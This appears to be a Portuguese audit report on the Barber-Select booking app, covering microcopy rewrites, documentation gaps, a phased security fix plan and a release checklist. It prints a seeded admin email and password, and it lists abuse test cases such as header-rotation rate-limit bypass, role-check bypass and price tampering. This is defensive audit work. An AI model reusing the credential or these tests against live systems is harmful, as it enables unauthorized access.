| **Fluxo de caixa** | `index.html:214` | ✅ Sim — contabilidade | **"Entradas e saídas"**. Use **"Caixa"** — é o que o dono diz (e já é o cabeçalho em `finance.html:386`). |
| **Transação** | `staff/finance.html:397, 447, 455` | ✅ Sim | **"Movimentação"** |
| **Ticket Médio** | `staff/dashboard.html:525`, `staff/venda.html:393` | ✅ Sim | **"Valor médio por atendimento"** |
| **Ficha** (detalhada) | `index.html:201` | ✅ Sim — em clínica é prontuário | **"Histórico do cliente"** |
| **Double-booking** | só no doc técnico | ✅ Sim, mas **interno** | Manter no relatório; **nunca** na UI. Na UI: "Dois atendimentos no mesmo horário". |
| **Estoque Baixo** | `staff/produtos.html:376` | 🟡 Parcial | **"Precisa repor"** — mais acionável |
| **Gerenciamento** | `staff/agenda.html:536`, `staff/configuracoes.html:257` | 🟡 Parcial | **"Gestão"** (ou eliminar) |
| **Comissão** | `index.html:197, 200` | 🟡 É real do ramo, mas tem duplo sentido | **Manter**, ancorando: "Comissão por atendimento" (1ª vez), "Suas comissões" (depois). Nunca sozinho num card. |
| **Status de acesso** | `staff/barbeiros.html:160` | 🟡 | **"Quem pode entrar"** |
| **Acesso liberado** | `staff-app.js:591` | 🟡 | **"Ele já pode entrar"** |

### 8.20 Os 10 piores estados de sistema

Critério: mensagem que **mente**, **não diz o que fazer**, **vaza jargão técnico** ou **promete o que não existe**.

| # | Local | Texto atual | Por que é um dos 10 piores | Texto reescrito |
|---|---|---|---|---|
| 1 ⭐ | `staff-app.js:690` | `alert('Agendamento criado com sucesso! (Funcionalidade em desenvolvimento)')` | 🔴 **Mente.** O usuário acredita que tem cliente marcado. Dano operacional real: o cliente chega e não tem hora. | "O agendamento ainda não está disponível nesta tela. Marque o horário pela Agenda." |
| 2 ⭐ | `staff-app.js:684` | `alert('Venda registrada com sucesso! (Funcionalidade em desenvolvimento)')` | 🔴 **Mente sobre dinheiro.** O dono acredita que a venda entrou no caixa. | "O registro de vendas ainda não está disponível. Anote a venda e lance depois no Financeiro." |
| 3 ⭐ | `staff-app.js:678` | `alert('Produto cadastrado com sucesso! (Funcionalidade em desenvolvimento)')` | 🔴 **Mente.** O estoque não muda. | "O cadastro de produtos ainda não está disponível." |
| 4 ⭐ | `staff-app.js:706` | `alert(\`Ver detalhes do cliente ${id} (em desenvolvimento)\`)` | 🔴 Mostra um **ID interno de banco** para o usuário final. | "A ficha do cliente ainda não está disponível." |
| 5 ⭐ | `client/settings.html:467-470` | "Desativar ou Excluir Conta" / "Remover permanentemente seus dados" → `alert('Entre em contato com o suporte **da barbearia**…')` | 🔴 Promete exclusão **permanente**, não faz nada, desvia para o suporte errado ("da barbearia", não "do Barber-Select"). **Risco de LGPD.** | Título: "Excluir sua conta" · "Agendamentos, histórico e avaliações serão apagados. Esse pedido não pode ser desfeito." · Botões: "Sim, excluir minha conta" / "Cancelar" |
| 6 ⭐ | `staff/barbeiros.html:67` | "Na próxima etapa, os dados serão enviados ao servidor…" | 🔴 Falso + vaza roadmap. | "Cada profissional entra com o e-mail e a senha que você definir." |
| 7 ⭐ | `staff/agenda.html:536` | "Gerenciamento em tempo real conectado ao banco de dados" | 🔴 Soa como texto de専案 de aula. | "Todos os horários do dia, atualizados na hora." |
| 8 | `client/profile.html:621` | "…salvos no banco de dados com sucesso!" | Vaza detalhe técnico ao cliente final. | "Perfil atualizado." |
| 9 | `client/home.html:614` | "Você não possui agendamentos no momento." | Estado vazio **sem saída** — não oferece botão nem explica. | "Você ainda não tem agendamentos. Escolha um serviço e marque seu horário." + botão "Agendar" |
| 10 | `staff/agenda.html:801` | "Nenhum agendamento encontrado para os filtros selecionados." | Não diferencia "não há clientes" de "filtro errado". | "Nenhum agendamento com esses filtros. Ajuste a data ou o profissional." + botão "Limpar filtros" |

**Bônus:**

| Local | Texto atual | Texto reescrito |
|---|---|---|
| `staff-app.js:431` | "usando o formulário ao lado" | "no formulário acima" |
| `staff/clients.html:397` | "Nenhum cliente encontrado." | "Nenhum cliente encontrado. Cadastre o primeiro em Clientes." |
| `staff/produtos.html:340` | "Controle completo integrado ao banco de dados" | "Cadastre produtos, defina preço e acompanhe o saldo." |

### 8.21 Padrão único de microcopy

O padrão "Erro ao X" / "Não foi possível X" aparece **24 vezes**. Crie 4 templates e aplique:

```js
// public/js/core/feedback.js
export const feedback = {
  erro:    (acao, dica)    => `Não foi possível ${acao}. ${dica}`,
  vazio:   (estado, acao)  => `${estado}. ${acao}`,
  carregando: (verbo)      => `${verbo}`,
  sucesso: (fato, efeito)  => `${fato}. ${efeito}`,
};
```

```js
// Exemplo de aplicação
showMessage(feedback.erro("salvar o agendamento", "Verifique os campos e tente de novo."), "error");
// → "Não foi possível salvar o agendamento. Verifique os campos e tente de novo."

showMessage(feedback.sucesso("Serviço salvo", "Ele já aparece no agendamento online."), "success");
// → "Serviço salvo. Ele já aparece no agendamento online."

showMessage(feedback.vazio("Nenhum cliente ainda", "Cadastre o primeiro em Clientes."), "info");
// → "Nenhum cliente ainda. Cadastre o primeiro em Clientes."
```

**Substituições completas (arquivo:linha → texto):**

| Local | Atual | Novo |
|---|---|---|
| `auth-manager.js:110` | "Erro de conexão" | "Sem conexão com o servidor. Verifique sua internet e tente de novo." |
| `auth-manager.js:141` | "Usuário ou senha incorretos." | "E-mail, usuário ou senha incorretos." |
| `auth-manager.js:152` | "Perfil inválido." | "Este tipo de acesso não existe." |
| `auth-manager.js:181` | "Por favor, preencha todos os campos." | "Preencha o e-mail e a senha para entrar." |
| `auth-manager.js:188, 190` | "Verificando..." + "Verificando suas credenciais..." | "Entrando..." (remover a duplicata) |
| `auth-manager.js:196` | "Login realizado com sucesso! Redirecionando..." | "Tudo certo. Entrando..." |
| `auth-manager.js:202` | "Erro ao fazer login. Tente novamente." | "Não foi possível entrar. Verifique o e-mail e a senha." |
| `register.js:94, 99, 104` | "Por favor, insira…" | "Digite…" |
| `register.js:109` | "A senha deve ter pelo menos 6 caracteres." | "Use uma senha com 6 caracteres ou mais." |
| `register.js:114, 180` | "As senhas não coincidem." | "As senhas não são iguais. Redigite a confirmação." |
| `register.js:119` | "Você precisa aceitar os termos de uso." | "Aceite os Termos de Uso e a Política de Privacidade para continuar." |
| `register.js:127, 129` | "Criando conta..." + "Criando sua conta..." | "Cadastrando..." (remover a duplicata) |
| `register.js:148` | "Conta criada com sucesso! Redirecionando para o login..." | "Conta criada. Agora é só entrar." |
| `register.js:154` | "Erro ao criar conta. Tente novamente." | "Não foi possível criar sua conta. Tente de novo." |
| `register.js:160` | "Não foi possível conectar ao servidor." | "Sem conexão com o servidor. Verifique sua internet e tente de novo." |
| `staff-app.js:337` | "O nome deve ter entre 2 e 100 caracteres." | "O nome do serviço precisa ter entre 2 e 100 caracteres." |
| `staff-app.js:341` | "Selecione uma categoria válida." | "Escolha uma categoria da lista." |
| `staff-app.js:345` | "Informe um preço válido maior que zero." | "Informe um preço maior que zero." |
| `staff-app.js:349` | "A duração deve ser entre 5 e 600 minutos." | "A duração precisa ficar entre 5 e 600 minutos." |
| `staff-app.js:375` | "Serviço cadastrado com sucesso." | "Serviço salvo. Ele já aparece no agendamento online." |
| `staff-app.js:415` | "Não foi possível carregar o catálogo" / "Tente atualizar a página." | "Não foi possível carregar os serviços." + botão "Tentar de novo" |
| `staff-app.js:505` | "Somente administradores podem cadastrar ou consultar a equipe." | "Só o administrador cadastra e consulta a equipe." |
| `staff-app.js:514` | "Você pode acessar as páginas operacionais pelo menu lateral." | "Use o menu lateral para acessar a agenda e os clientes." |
| `staff-app.js:552` | "Informe um telefone com DDD ou deixe o campo vazio." | ✅ **já está correto — mantenha** |
| `staff-app.js:556` | "A senha deve ter pelo menos 8 caracteres." | "Use uma senha com 8 caracteres ou mais." |
| `staff-app.js:560` | "A confirmação de senha não confere." | "As senhas não são iguais. Redigite a confirmação." |
| `staff-app.js:591` | "Barbeiro cadastrado com sucesso. O acesso por e-mail e senha já está liberado." | "Profissional cadastrado. Ele já pode entrar com o e-mail e a senha que você definiu." |
| `shared.js:151` | "Sair do Sistema" | "Sair da conta" |
| `shared.js:152` | "Tem certeza que deseja encerrar sua sessão?" | "Você vai sair da sua conta. Deseja continuar?" |
| `shared.js:156` | "Sair" | "Sair da conta" |
| `pages/login.html:104` | "Bem-vindo de volta" | "Acesse sua conta" |
| `pages/login.html:105` | "Entre com seus dados para acessar o painel." | "Use seu e-mail ou usuário e a senha." |
| `pages/login.html:151` | "Entrar no Sistema" | "Entrar" |
| `pages/login.html:156-168` | "ou acesso rápido" + botões Google/Microsoft `disabled` | Remover o bloco enquanto estiverem desabilitados |
| `pages/login.html:174` | "Cadastre sua barbearia" | "Crie sua conta de cliente" |
| `pages/cadastro.html:96` | "Crie sua conta" | "Crie sua conta de cliente" |
| `pages/cadastro.html:97` | "Cadastre-se como cliente para agendar seus serviços." | "Cadastre-se para agendar horários e acompanhar seus serviços." |
| `pages/cadastro.html:207` | "Fazer login" | "Entrar" |
| `client/home.html:463` | "Seja bem-vindo à sua área exclusiva de cuidados" | "Agende, remarque e acompanhe seus horários." |
| `client/home.html:487` | "Programa Fidelidade" / "12 pts" | "Programa de fidelidade" / "12 pontos" |
| `client/home.html:514` | "Agende em segundos" | "Novo agendamento" |
| `client/home.html:515` | "Seu estilo em boas mãos" | "Seu próximo corte, no seu horário" |
| `client/home.html:516` | "Escolha o serviço ideal, seu barbeiro favorito e garanta seu horário sem filas ou espera." | "Escolha o serviço e o profissional. O horário fica reservado assim que você confirmar." |
| `client/home.html:525` | "Serviços Populares na Barbearia" | "Serviços da barbearia" |
| `client/request.html:349` | "Escolha o serviço, profissional e horário ideal" | "Escolha o serviço, o profissional e o horário." |
| `client/request.html:395` | "Confirmar e Enviar para Agenda" | "Confirmar agendamento" |
| `client/request.html:471` | "Agendamento realizado com sucesso! Já está visível na agenda da barbearia." | "Agendamento confirmado. A barbearia já pode ver." |
| `client/profile.html:408` | "Meu Perfil & Preferências" | "Meu perfil" |
| `client/profile.html:409` | "Gerencie seus dados cadastrais, estilo e benefícios VIP" | "Atualize seus dados, o estilo que você corta e suas preferências." |
| `client/profile.html:436` | "E-mail de Acesso (Não editável)" | "E-mail de acesso" + nota "O e-mail de acesso não pode ser alterado." |
| `client/profile.html:461` | "Estilo de Cabelo Frequente" | "Estilo de cabelo mais pedido" |
| `client/profile.html:477` | "Raramente uso barba" | "Corto barba de vez em quando" |
| `client/profile.html:482` | "Observações / Sensibilidade na Pele" | "Observações sobre a sua pele" |
| `client/profile.html:489` | "Benefícios & Fidelidade" | "Fidelidade e benefícios" |
| `client/profile.html:523` | "Salvar Todas as Alterações" | "Salvar alterações" |
| `client/settings.html:378` | "Configurações da Conta" | "Configurações" |
| `client/settings.html:379` | "Gerencie notificações, aparência e privacidade" | "Escolha o que quer receber e como o sistema aparece." |
| `client/settings.html:429` | "Escolher entre o modo claro clássico ou escuro" | "Claro ou escuro" |
| `client/settings.html:434` | "Automático (Sistema)" | "Automático (segue o aparelho)" |
| `client/settings.html:441` | "Ajustar legibilidade do texto na tela" | "Aumentar ou diminuir o tamanho do texto" |
| `client/settings.html:452` | "Privacidade & Zona de Perigo" | "Privacidade" |
| `client/settings.html:456-457` | "depoimentos da barbearia" | "nas avaliações da barbearia" |
| `staff/dashboard.html:447` | "Dashboard Executivo" | "Hoje na barbearia" |
| `staff/dashboard.html:448` | "Métricas e visão geral da barbearia" | "Atendimentos, caixa e próximos horários" |
| `staff/dashboard.html:525` | "Ticket Médio" | "Valor médio por atendimento" |
| `staff/dashboard.html:596` | "+18% vs semana anterior" | "+18% em relação à semana anterior" |
| `staff/dashboard.html:604` | "Ver todos" | "Ver a agenda completa" |
| `staff/dashboard.html:644` | "Nova Agenda" | "Novo agendamento" |
| `staff/dashboard.html:652` | "Cadastrar cliente" (redundante com o título) | "Registrar nome, telefone e e-mail" |
| `staff/dashboard.html:659` | "Gerenciar catálogo" | "Corte e barba, com preço e duração" |
| `staff/dashboard.html:666` | "Registrar caixa" (não corresponde à ação) | "Lançar venda e forma de pagamento" |
| `staff/agenda.html:535` | "Agenda Inteligente" | "Agenda" |
| `staff/agenda.html:580` | "Faturamento Previsto" | "Receita prevista para hoje" |
| `staff/agenda.html:628-629` | "Atendimentos" / "Exibindo agendamentos sincronizados" | "Agendamentos" / "Mostrando {n} agendamentos" |
| `staff/agenda.html:726` | "Salvar Agendamento" | "Confirmar agendamento" |
| `staff/agenda.html:801` | "Nenhum agendamento encontrado para os filtros selecionados." | "Nenhum agendamento com esses filtros. Ajuste a data ou o profissional." + botão "Limpar filtros" |
| `staff/agenda.html:821` | `title="Concluir / Confirmar"` (um botão, duas ações) | "Concluir atendimento" (se confirmado) / "Confirmar agendamento" (se pendente) |
| `staff/agenda.html:824, 547, 566, 561` | `title="Excluir"` | `title="Excluir {objeto} de {cliente}"` |
| `staff/clients.html:262` | "Base de clientes cadastrados no Barber-Select" | "Todos os clientes cadastrados" |
| `staff/clients.html:319` | "Lista de Clientes Cadastrados" | "Clientes cadastrados" |
| `staff/clients.html:397` | "Nenhum cliente encontrado." | "Nenhum cliente encontrado. Cadastre o primeiro em Clientes." |
| `staff/barbeiros.html:47` | "Equipe de barbeiros" | "Equipe" |
| `staff/barbeiros.html:66` | "Um time forte começa com um bom cadastro." | "Cadastre a equipe com acesso individual." |
| `staff/barbeiros.html:79, 98, 159` | "do barbeiro" / "usado pelo barbeiro" / "Barbeiros cadastrados" | "do profissional" / "É por este e-mail que o profissional vai entrar." / "Profissionais cadastrados" |
| `staff/barbeiros.html:150` | "A equipe poderá ser consultada nesta página após o cadastro." | "A equipe cadastrada aparece aqui." |
| `staff/barbeiros.html:160` | "Consulte todos os profissionais cadastrados e o status de acesso de cada um." | "Veja quem já está cadastrado e quem pode entrar." |
| `staff/barbeiros.html:180` | "Aguarde enquanto buscamos os registros cadastrados." | "Só um instante." |
| `staff/services.html:46` | "Organize seu catálogo e prepare os horários para agendamento" | "Cadastre o que você corta, com preço e duração." |
| `staff/services.html:64` | "Seu próximo agendamento começa aqui." | "Cadastre seus serviços" |
| `staff/services.html:65` | "Essas informações poderão ser usadas na escolha do serviço e no cálculo dos horários disponíveis." | "O preço aparece para o cliente e a duração define o tempo reservado na agenda." |
| `staff/services.html:93` | "A descrição pode ajudar o cliente a escolher na tela de agendamento." | "O cliente lê esta descrição ao agendar." |
| `staff/services.html:131` | "Preparado para a agenda: a duração será usada futuramente…" | "A duração define quanto tempo esse serviço ocupa na agenda." |
| `staff/services.html:147` | "Gerencie os serviços que poderão ser oferecidos aos clientes." | "Estes são os serviços que o cliente pode agendar." |
| `staff/services.html:195` | "Serviços inativos não deverão aparecer…; registros já utilizados poderão continuar associados ao histórico." | "Serviço desativado some do agendamento online. Os atendimentos já feitos continuam no histórico." |
| `staff/produtos.html:339` | "Gestão de Produtos & Estoque" | "Produtos e estoque" |
| `staff/produtos.html:388` | "Valor em Estoque" | "Valor total do estoque" |
| `staff/produtos.html:427` | "Estoque Mínimo" | "Estoque mínimo" + nota "Quando o saldo chega aqui, o produto entra em 'Precisa repor'." |
| `staff/produtos.html:454` | "Produtos no Estoque" | "Produtos cadastrados" |
| `staff/venda.html:345` | "PDV & Vendas" | "Vendas" |
| `staff/venda.html:369` | "Total Vendas" | "Total das vendas" |
| `staff/venda.html:381` | "Qtd. Vendas" | "Número de vendas" |
| `staff/venda.html:393` | "Ticket Médio" | "Valor médio por venda" |
| `staff/venda.html:404` | "Nova Venda / Caixa" | "Nova venda" |
| `staff/venda.html:418` | "Item (Serviço ou Produto) *" | "Item vendido *" + nota "Serviço ou produto" |
| `staff/venda.html:429` | "Valor * (R$)" | "Valor da venda *" |
| `staff/finance.html:337` | "Gestão Financeira & Caixa" | "Caixa" |
| `staff/finance.html:338` | "Controle de entradas, saídas e saldo em tempo real" | "Veja as entradas, as saídas e o saldo" |
| `staff/finance.html:362, 374` | "Total Entradas" / "Total Saídas" | "Total das entradas" / "Total das saídas" |
| `staff/finance.html:397` | "Nova Transação" | "Nova movimentação" |
| `staff/finance.html:447` | "Registrar Transação" | "Registrar movimentação" |
| `staff/finance.html:455` | "Transações Registradas" | "Movimentações registradas" |
| `staff/finance.html:462` | `placeholder="Buscar..."` | "Buscar movimentação" |
| `staff/relatorios.html:204` | "↗ +18% &nbsp; em relação ao período anterior" | "+18% em relação ao período anterior" |
| `staff/relatorios.html:232` | "Histórico de atendimentos" | "Relatório de atendimentos" |
| `staff/relatorios.html:239` | "Produtividade por barbeiro" | "Produtividade por profissional" |
| `staff/configuracoes.html:80` | "Gerencie as configurações da sua barbearia" | "Dados, horários e unidades da sua barbearia" |
| `staff/configuracoes.html:257` | "GERENCIAMENTO DE UNIDADES (SAAS)" | "Unidades da barbearia" |
| `staff/configuracoes.html:263-264` | "Como administrador de uma rede de barbearias, você pode alternar entre unidades…" | "Se sua barbearia tem mais de uma unidade, troque entre elas ou cadastre uma nova filial." |
| `staff/novocliente.html:121-122` | H1 duplicado | Remover o H1 da linha 121 |
| `staff/novocliente.html:143` | "Telefone/WhatsApp" | "Telefone / WhatsApp" |
| `staff/novagendamento.html:120` | "preencha as informações abaixo…" | "Preencha as informações abaixo…" |
| `staff/novagendamento.html:166` | "Degrade" | "Degradê" |
| `staff/novagendamento.html:188` | "Horarios disponiveis" | "Horários disponíveis" |
| `staff/novagendamento.html:211` | "cliente" | "Cliente" |
| `staff/novagendamento.html:212` | "Bruno ferreira" | "Bruno Ferreira" |
| `staff/novagendamento.html:221` | "Data e horario" | "Data e horário" |

### 8.22 Plano de implementação de texto

**10 Quick Wins (impacto × esforço):**

| # | ⭐ | Mudança | Onde | Impacto | Esforço |
|---|---|---|---|---|---|
| 1 | ⭐ | **Remover os 4 `alert()` de "sucesso" que mentem** | `staff-app.js:678,684,690,706` | 🔴 Crítico — confiança e dano operacional | Baixo |
| 2 | ⭐ | **Trocar o H1 "Gestão inteligente" nas 3 telas** | `index.html:65`, `login.html:50`, `cadastro.html:43` | 🔴 Alto — primeira frase que o mercado lê | Baixo |
| 3 | ⭐ | **"Cadastre sua barbearia" → "Crie sua conta de cliente"** | `login.html:174` | 🔴 Alto — promessa falsa | Trivial |
| 4 | ⭐ | **Remover os 3 `eyebrow` vazios da landing** | `index.html:167,233,292` | 🟠 Alto — tira 3 tells de IA | Baixo |
| 5 | ⭐ | **Unificar "Configurações" (não "Ajustes") e "Sair" (não "Sair do Sistema")** | 4 telas do cliente + `shared.js:151` | 🟠 Alto — consistência em toda a navegação | Trivial |
| 6 | ⭐ | **Padronizar o termo do profissional: "Profissional"** (não "Barbeiro"/"Colaborador" como cargo) | `agenda.html:599,702`, `barbeiros.html:79,98,159`, `novagendamento.html:171`, `staff-app.js:544,586,591` | 🟠 Alto — elimina ambiguidade de cargo | Médio (8 pontos) |
| 7 | ⭐ | **Criar o padrão "Não foi possível X. [ação]."** e aplicar às ~24 mensagens | 24 pontos listados na §8.21 | 🟠 Alto — a maior janela de leitura | Médio (1 padrão) |
| 8 | ⭐ | **Resolver "+1.500 barbearias" vs "centenas de barbearias"** | `index.html:84` vs `:295` | 🟡 Médio — credibilidade | Trivial |
| 9 | ⭐ | **Dar ação aos 7 estados vazios** | 8 pontos | 🟡 Médio — cada vazio é uma saída perdida | Médio |
| 10 | ⭐ | **Remover o texto de debug/infra exposto ao usuário** | `auth.html:27-30`, `barbeiros.html:67`, `services.html:131`, `agenda.html:536,629`, `produtos.html:340`, `venda.html:346`, `profile.html:621`, `index.html:246,266` | 🟡 Médio — o usuário não deve ver "banco de dados", "JWT", "servidor" | Médio |

> **Se você só puder corrigir 5: #1, #2, #3, #4 e #7.** As três primeiras são promessas falsas — o pior tipo de erro de copy, porque quando o texto mente, a marca perde mais do que com um texto ruim.

**5 mudanças estruturais:**

| # | Mudança | Por que |
|---|---|---|
| **E1** | **Escrever um "glossário do produto" de uma página e aplicá-lo via constante única** (`public/js/core/termos.js`). 25 termos canônicos. | Sem fonte única de verdade, a inconsistência volta em duas semanas. |
| **E2** | **Reescrever a landing no registro das telas internas**: *problema concreto → o que o sistema faz por módulo → prova → CTA*. Sem adjetivo, sem "inteligente", sem claim não verificável. | É a peça mais visível e a que mais promete o que o app não faz. |
| **E3** | **Trocar telas mockadas por estado real ou rótulo honesto.** Enquanto o dashboard não ler do banco: selo "Dados de exemplo". Remover "Cliente VIP Ouro", "12 pts", "BARBER15OFF" e a lista de serviços hardcoded. | Texto que promete número é dívida. |
| **E4** | **Reescrever todos os estados de sistema** com o modelo "o que aconteceu + o que fazer" (§8.21). | Microcopy é onde a IA mais se denuncia: "Erro ao X" aparece 24 vezes. |
| **E5** | **Separar os três registros de escrita** e dar a cada um seu público: landing (dono, linguagem de resultado) · área da equipe (profissional, linguagem de ferramenta: "Marque", "Salve", "Lance") · área do cliente (freguês, linguagem de smartphone). Declarar isso no `CLAUDE.md`. | É a causa raiz. Sem separar os registros, cada correção puntual se desfaz na próxima página nova. |

---

## 📚 9. Documentação e DX

### [X-01] 🔴 Não existe `README.md`

O repositório tem `CLAUDE.md` (contexto para agentes), `How To Use.md` (guia de instalação), `CREDENCIAIS-DEBUG.md` e `RELATORIO-AUDITORIA-BARBER-SELECT.md` — **mas nenhum README**. Quem chega pelo GitHub vê um repositório sem descrição, sem screenshot, sem instrução de instalação, sem lista de features e sem contato.

**Modelo pronto em §12.**

### [X-02] 🟡 O guia de uso e o `.env.example` inexistente

> **🔎 Correção da revisão:** o `How To Use.md` **não** é exclusivo de Windows: traz comandos `bash` e alternativas em PowerShell. O defeito real é que ele manda executar `cp .env.example .env`, mas **o arquivo `.env.example` não existe** no repositório.

`How To Use.md`:

```
```powershell
cd "C:\Users\seu-usuario\Desktop\Barber-Select"
```
```

Funciona apenas no Windows e assume que o projeto está em `Desktop`. Num time macOS/Linux, a pessoa simplesmente não consegue seguir. E o documento é sobre **VS Code** (File > Open Folder, Terminal > New Terminal), não sobre o produto.

### [X-03] 🟠 O relatório de auditoria existente está desatualizado e superestima o risco residual

`RELATORIO-AUDITORIA-BARBER-SELECT.md` (13/11/2026) dá **8,5/10 em Frontend/UX ("Excelente")** e **8,0/10 em Segurança ("Bom")**. O teste em runtime contradiz ambas:

| Afirmação do relatório | Estado real verificado |
|---|---|
| "Fase 1 (Integridade ACID)" ✅ | ✅ **Realmente feita** — este item está correto |
| "Fase 2 (Concorrência)" ✅ | ⚠️ **Parcial** — há `FOR UPDATE`, mas **sem *unique constraint*** (P1-06) |
| "Fase 3 (Estoque)" ✅ | ⚠️ **Parcial** — abate por **nome** do produto, não por id (P2-02) |
| "Fase 5 (LGPD)" ✅ | ⚠️ **Parcial** — anonimização não cobre `appointments`/`sales`/`transactions` (P1-07) e **não há política de privacidade, encarregado, base legal nem registro de operações** (§6.5) |
| "Design System unificado coeso" | ❌ **Falso** — 4 `:root` com tokens conflitantes (D-02) |
| "Frontend 8,5/10 — Excelente" | ❌ **Superestimado** — 9 telas com o script inline bloqueado (P0-02) e um XSS armazenado vivo (P0-07) |
| "Segurança 8,0/10 — Bom" | ❌ **Superestimado** — 14 rotas sem RBAC (P0-01) |

O relatório deve ser **substituído por este** ou marcado como histórico.

### [X-04] 🟡 `CREDENCIAIS-DEBUG.md` documenta as senhas padrão em texto aberto

O arquivo lista as credenciais seedadas (`admin@barberselect.local` / `AdminPassword2026!`). Publicar a senha de admin no repositório é o mesmo que entregá-la. Remova do git (`.gitignore`) e documente o procedimento de seed no README, com instrução de trocar a senha.

### [X-05] 🟡 `skills-lock.json` na raiz do repositório

Um lockfile de skills de IA versionado na raiz. Se faz sentido para o time, mova para `.agents/` (já está no `.gitignore`) ou documente por que é rastreado.

### [X-06] 🟡 Zero testes, zero lint, zero CI

Ver §5.5.

---

## 🗺️ 10. Plano de ação priorizado

### Fase 1 — Destravar (bloqueia qualquer deploy) · ~4 dias

- [ ] **P0-01 / X-01** `STAFF_ROLES` nas 13 rotas + **inverter o default de `authenticate()`** (sem roles = sem autorização) + `test/authz.test.js` que falhe hoje
- [ ] **X-01** Rate limiter com `keyGenerator` no socket (nunca no `X-Forwarded-For`) e `trust proxy` explícito
- [ ] **X-02 / X-03** Lockout por `identidade+IP` **e** registrar falhas também nos caminhos de login do MySQL
- [ ] **X-04** Blacklist por `jti` + `exp` (access tokens também com `jti`), nunca `clear()`
- [ ] **X-05** Remover o fallback `.env` de senha de produção (ou isolá-lo com `timingSafeEqual` + `NODE_ENV`)
- [ ] **P0-02** Remover os 16 `onclick` e os 9 `<script>` inline (**não** relaxar a CSP)
- [ ] **P0-03** Trava de execução única no `refreshAccessToken()` + renovação proativa
- [ ] **P0-04** `opsz=9..40` nas 12 URLs → **ou melhor: self-host das fontes** (resolve §6.5.4 junto)
- [ ] **P0-05** Corrigir `ADD COLUMN IF NOT EXISTS` para migração idempotente (destrava perfil + exportação LGPD + anonimização)
- [ ] **P0-06** Desabilitar seed de contas padrão fora de dev; remover do git a senha
- [ ] **P0-07** `escapeHtml(s.status)` + whitelist de status no servidor + `ENUM` no schema
- [ ] **X-06** Lançamento financeiro com `source_type`/`source_id` + estorno ao reverter/excluir
- [ ] **X-07** Resolver `service_price` no servidor a partir do catálogo
- [ ] **P1-01** Uma única `escapeHtml` (com aspas) em `shared.js`; deletar as outras 6; adotar `clients-page.js`

### Fase 2 — Blindar · ~4 dias

- [ ] **P1-02** `trust proxy` por allowlist + `npm audit fix` (proxy-addr CRITICAL) + `host` explícito no `listen`
- [ ] **P1-03** Rotear as 10 chamadas por `authenticatedFetch()`; corrigir `agenda.html:783`
- [ ] **P1-04** Logout do cliente passando por `logout()` → `POST /auth/logout`
- [ ] **P1-05** `PUT /api/products/:id` com whitelist + validação (e `PATCH` em vez de `PUT`)
- [ ] **P1-06 / X-08** Índice composto + `UNIQUE` gerado em `appointments`, chaveado por `staff_id`
- [ ] **P1-07 / X-14** Anonimização LGPD completa (3 tabelas) + exportação LGPD sem `OR client_phone`
- [ ] **P1-08** Sessões em Redis (ou tabela MySQL) + refresh token **armazenado como hash** (X-20)
- [ ] **P1-09 / X-22** Remover o fallback de `JWT_REFRESH_SECRET`; rejeitar placeholders conhecidos
- [ ] **P1-10** Rate limit em `/auth/refresh` + limite global em `/api/`
- [ ] **X-09 / X-10 / X-17** `Number.isFinite` nos valores, `??` nos defaults, escape de `LIKE`
- [ ] **X-12** `req.body ?? {}` em todas as rotas + middleware de erro que respeite `err.status`
- [ ] **X-13** Enumerar colunas em todas as queries; `cost_price` só para admin; mascarar CPF
- [ ] **D-01** Corrigir os 14 FAILs do inspetor (foco visível, `prefers-reduced-motion`, remover eyebrows/gradientes/sombras)
- [ ] **D-04** Corrigir o overflow de 301 px no dashboard mobile
- [ ] **§6.5** Aviso de Privacidade + Termos + encarregado + base legal por finalidade + registro de operações (art. 37) + portabilidade com UI

### Fase 3 — Consolidar · ~1 semana

- [ ] **P3-01** Uma implementação da página de clientes (adotar `clients-page.js`)
- [ ] **P3-02/P3-03** Extrair sidebar (13 → 1) e CSS do cliente (1.300 → ~350 linhas)
- [ ] **P3-05** `npm test` (node --test + supertest), `eslint`, `prettier`, GitHub Actions
- [ ] **X-11** Uma única definição de `transactions`/`products`/`appointments` (migração compartilhada)
- [ ] **X-18** Helper `withTransaction()` com caminho único de release
- [ ] **P3-07** `escapeHtml` único + validação única + `issueSession()` compartilhado
- [ ] **P2-01** Migrations versionadas no boot; remover `ensureTable()` das rotas
- [ ] **D-02** Unificar tokens em `public/styles/tokens.css`
- [ ] **§8** Aplicar as 5 headlines novas, remover os 3 eyebrows, padronizar os 13 termos, corrigir os acentos
- [ ] **X-01 / P3-05** Subir o custo do bcrypt para 12 **depois** de corrigir o limiter
- [ ] **X-01** Escrever o `README.md`; guia multiplataforma; substituir o relatório antigo

### Fase 4 — Polir · ~1 semana

- [ ] **D-06** Um `<h1>` por página; labels em 3 páginas; tabela alternativa para o gráfico; toggle de senha como `<button>`
- [ ] **D-08** Formatador único de moeda/KPI e vocabulário dos KPIs
- [ ] **P2-06/P2-07** Remover os 4 `alert()` falsos e rotular os dados de exemplo
- [ ] **P2-04** Valores monetários em centavos inteiros
- [ ] **P2-08** Middleware de erro com 503 para banco indisponível
- [ ] **X-15** Apagar `/auth/validate-access` e o endpoint de demonstração
- [ ] **§6.5.7** Política de retenção + rotina de expiração

---

## ✅ 11. Checklist de pré-entrega

- [ ] `npm run lint && npm test` passa no CI
- [ ] Nenhum `console.log` de depuração em `public/`
- [ ] Nenhum `alert()` em código de produção
- [ ] Nenhum handler inline (`onclick=`, `<script>` sem `src`) — a CSP é a garantia
- [ ] `npm audit` sem vulnerabilidade high/critical
- [ ] Fontes carregam (`document.fonts.check('DM Sans') === true`) — **e são self-hosted**
- [ ] Foco visível em todos os controles interativos
- [ ] `prefers-reduced-motion` respeitado
- [ ] Nenhum overflow horizontal em 320/375/390/768/1440 px
- [ ] Um único `<h1>` por página; todo input com `<label>`
- [ ] Todo gráfico com alternativa textual
- [ ] Nenhum termo duplicado para o mesmo conceito
- [ ] Nenhum dado hardcoded apresentado como real (ou rotulado "Dados de exemplo")
- [ ] `README.md` presente, com setup multiplataforma
- [ ] Nenhuma senha ou credencial de seed no repositório
- [ ] `curl /api/finance` com token de `client` → **403**
- [ ] `POST /api/sales` com `status` arbitrário → **rejeitado**
- [ ] `POST /api/appointments` com `service_price: 0.01` → **preço ignorado**, vem do catálogo
- [ ] 13 tentativas de login com `X-Forwarded-For` rotacionado → **429**
- [ ] 5 senhas erradas contra uma identidade conhecida → **não** bloqueia a vítima com a senha correta
- [ ] Logout → token ainda **401** após 1001 entradas na blacklist
- [ ] Aviso de Privacidade e Termos acessíveis (sem `href="#"`)
- [ ] Encarregado nomeado e publicado
- [ ] Base legal declarada por finalidade; consentimento para dados sensíveis
